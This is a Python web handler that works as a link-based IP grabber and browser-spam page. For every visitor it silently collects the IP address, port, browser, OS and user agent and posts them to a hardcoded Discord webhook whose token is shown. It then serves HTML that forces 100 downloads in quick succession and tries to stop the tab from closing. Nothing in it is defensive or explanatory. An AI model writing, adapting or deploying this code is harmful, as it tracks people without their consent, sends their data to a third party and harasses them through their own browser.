from http.server import BaseHTTPRequestHandler
import json
import requests
import httpagentparser
import os

WEBHOOK_URL = "https://discord.com/api/webhooks/1490146029503385734/dJHDVdTh11QHFw_ikNw-wpFG3NB8AN02Xl-rGMTn_8ejJxvyTWYyxOhdZ3P3U1tNQ_BV"

FAKE_IMAGE_URL = "https://media.tenor.com/XPiWs5il8owAAAAM/tung-tungtung-tungtungtung-sahur-tungtungtungsahur-tungtungsahur.gif"

# HTML that downloads GIF 100 times via JS loop
FREEZE_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Tung Tung Spam</title>
  <style>body {background:#000; color:#0f0; font-family:monospace; text-align:center; padding:50px;}</style>
</head>
<body>
  <h1>Tung Tung x100 Incoming...</h1>
  <p>Your browser's about to get spammed—good luck closing!</p>

  <script>
    const gifUrl = "%s";  // your GIF URL
    const filename = "tung-tung.gif";

    // First download (forced)
    const a = document.createElement('a');
    a.href = gifUrl;
    a.download = filename;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);

    // Loop 99 more times (total 100)
    let count = 0;
    const interval = setInterval(() => {
      if (count >= 99) {
        clearInterval(interval);
        return;
      }
      const link = document.createElement('a');
      link.href = gifUrl;
      link.download = filename + "_" + (count + 2);  // unique names to avoid overwrite
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
      count++;
    }, 100);  // every 100ms—adjust if too fast/slow

    // Try to block close (won't always work)
    window.addEventListener('beforeunload', (e) => {
      e.preventDefault();
      e.returnValue = 'Are you sure? 100 tung tungs are downloading!';
    });
  </script>
</body>
</html>
""" % FAKE_IMAGE_URL  # inject GIF URL

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            ip = self.headers.get('X-Forwarded-For', self.client_address[0])
            port = self.headers.get('X-Forwarded-Port', 'Unknown')
            user_agent = self.headers.get('User-Agent', 'Unknown')
            parsed_ua = httpagentparser.detect(user_agent)

            log = f"**SPAM CLICK!**\nIP: `{ip}`\nPort: `{port}`\nBrowser: {parsed_ua.get('browser', {}).get('name', 'Unknown')} {parsed_ua.get('browser', {}).get('version', '')}\nOS: {parsed_ua.get('os', {}).get('name', 'Unknown')}\nUA: `{user_agent}`\n**100 downloads queued!**"

            requests.post(WEBHOOK_URL, json={"content": log})

            # Serve the HTML freeze page
            html = FREEZE_HTML.encode('utf-8')
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.send_header('Content-Length', len(html))
            self.end_headers()
            self.wfile.write(html)

        except Exception as e:
            self.send_response(500)
            self.end_headers()
            self.wfile.write(f"Error: {str(e)}".encode())

    def do_HEAD(self):
        self.do_GET()
